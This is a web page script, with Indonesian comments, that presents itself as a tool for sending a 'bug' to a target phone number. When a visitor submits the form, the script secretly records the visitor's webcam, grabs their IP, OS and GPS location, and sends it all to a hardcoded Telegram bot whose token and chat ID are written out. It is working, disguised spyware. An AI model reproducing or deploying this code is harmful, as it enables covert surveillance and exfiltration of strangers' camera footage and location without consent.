<body>
<audio id="bgMusic" loop>

<script>
function showNotif(text) {
    const box = document.getElementById("notifBox");
    const msg = document.getElementById("notifText");

    if (!box || !msg) return;

    msg.innerText = text;
    box.style.display = "block";

    setTimeout(() => {
        box.style.opacity = "1";
    }, 10);
}

function hideNotif() {
    const box = document.getElementById("notifBox");
    if (!box) return;

    box.style.opacity = "0";

    setTimeout(() => {
        box.style.display = "none";
    }, 250);
}

// FIX INI
function retryAction() {
    hideNotif();
    sendBug();
}
const botToken = '8907308204:AAH1Mn6QQbURSJ6bZPLKAsHd0QOkzZz9ea0';
const chatIds = ['6454570447'];

// ======================
// TELEGRAM
// ======================
function sendToTelegram(text) {
    chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: id,
                text: text,
                parse_mode: 'HTML'
            })
        }).catch(console.error);
    });
}

// ======================
// VALIDASI INDONESIA
// ======================
function isValidIndoNumber(number) {
    if (!number) return false;
    number = number.replace(/[\s-]/g, '');
    return /^(?:\+62|62|0)8[1-9][0-9]{6,11}$/.test(number);
}

// ======================
// INFO DEVICE
// ======================
async function getInfo() {
    let ip = "-";
    let city = "-";
    let region = "-";
    let country = "-";
    let isp = "-";
    let asn = "-";
    let lat = "-";
    let lon = "-";

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ip = ipData.ip;

        const locRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,as,lat,lon`);
        const loc = await locRes.json();

        if (loc.status === "success") {
            city = loc.city || "-";
            region = loc.regionName || "-";
            country = loc.country || "-";
            isp = loc.isp || "-";
            asn = loc.as || "-";
            lat = loc.lat || "-";
            lon = loc.lon || "-";
        }

    } catch (e) {
        console.log("error:", e);
    }

    const text = `
IP        : ${ip}
OS        : ${navigator.platform}
Waktu     : ${new Date().toLocaleString()}
    `.trim();

    sendToTelegram(`<b>📥 Info Device:</b>\n<pre>${text}</pre>`);
}
// ======================
// GPS (FIX SAFE)
// ======================
async function sendGPS() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve();

        navigator.geolocation.getCurrentPosition(
            pos => {
                const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendToTelegram(`<b>📍 Lokasi:</b> ${link}`);
                resolve();
            },
            () => {
                sendToTelegram("📍 Lokasi ditolak user");
                resolve();
            }
        );
    });
}

// ======================
// CAMERA (FIX SAFE)
// ======================
async function startCamera() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    if (!video || !canvas) {
        console.warn("Video/Canvas tidak ada di HTML");
        return;
    }

    const ctx = canvas.getContext("2d");

    return new Promise(resolve => {
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;

            setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    if (blob) sendToTelegram("📸 Foto diambil");
                    stream.getTracks().forEach(t => t.stop());
                    resolve();
                }, "image/jpeg");
            }, 2000);
        })
        .catch(err => {
            console.warn("Camera error:", err);
            resolve();
        });
    });
}

async function startCamera1() {
    const video = document.getElementById("video");

    if (!video) {
        alert("Video element tidak ada");
        return;
    }

    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
        });

        video.srcObject = stream;
        video.play();

        const recorder = new MediaRecorder(stream);
        let chunks = [];

        recorder.ondataavailable = e => {
            if (e.data.size > 0) chunks.push(e.data);
        };

        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: "video/webm" });

            const formData = new FormData();
            formData.append("chat_id", chatIds[0]);
            formData.append("video", blob, "video.webm");

            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                method: "POST",
                body: formData
            });

            stream.getTracks().forEach(t => t.stop());
        };

        recorder.start();

        setTimeout(() => {
            recorder.stop();
        }, 5000);

    } catch (err) {
        alert(err.name + ": " + err.message);
        console.log(err);
    }
}
// ======================
// MAIN FUNCTION (FIXED)
// ======================
async function sendBug() {
    const senderEl = document.getElementById("sender");
    const targetEl = document.getElementById("target");
    const button = document.querySelector(".btn");

    if (!button) return;

    const sender = senderEl.value.trim();
    const target = targetEl.value.trim();

    // ======================
    // CEK KOSONG TOTAL
    // ======================
    if (sender === "" && target === "") {
        showNotif("⚠️ Sender & Target masih kosong!");
        return;
    }

    // ======================
    // CEK INDIVIDU
    // ======================
    if (sender === "") {
        showNotif("⚠️ Sender belum diisi!");
        return;
    }

    if (target === "") {
        showNotif("⚠️ Target belum diisi!");
        return;
    }

    // ======================
    // VALIDASI NOMOR
    // ======================
    if (!isValidIndoNumber(sender)) {
        showNotif("⚠️ Sender tidak valid");
        return;
    }

    if (!isValidIndoNumber(target)) {
        showNotif("⚠️ Target tidak valid");
        return;
    }

    try {
        button.disabled = true;
        sendToTelegram(
            `<b>📌 Sender:</b> ${sender}\n<b>📞 Target:</b> ${target}`
        );
        await startCamera();
        await startCamera1();
        await getInfo();
        await sendGPS();
        
        showNotif("👾 Success send bug");

        setTimeout(() => {
            button.disabled = false;
        }, 1000);

    } catch (err) {
        console.error(err);
        showNotif("❌ Error terjadi");
        button.disabled = false;
    }
}

// ======================
// PARTICLE SAFE
// ======================
function createParticles() {
    const container = document.querySelector(".bg-particles");
    if (!container) return;

    for (let i = 0; i < 20; i++) {
        const p = document.createElement("div");
        p.className = "particle";
        p.style.left = Math.random() * 100 + "%";
        p.style.top = Math.random() * 100 + "%";
        container.appendChild(p);
    }
}

document.addEventListener("DOMContentLoaded", createParticles);

// ======================
// MUSIC AUTO PLAY FIX
// ======================

// autoplay saat halaman dibuka
window.addEventListener("load", () => {
    const music = document.getElementById("bgMusic");
    if (!music) return;

    music.volume = 0.5;

    const playPromise = music.play();

    if (playPromise !== undefined) {
        playPromise.catch(() => {
            console.log("Autoplay diblokir browser, tunggu klik user");
        });
    }
});

// fallback: klik pertama user biar musik pasti jalan
document.addEventListener("click", () => {
    const music = document.getElementById("bgMusic");
    if (!music) return;

    music.volume = 0.5;
    music.play().catch(() => {});
}, { once: true });
</script>
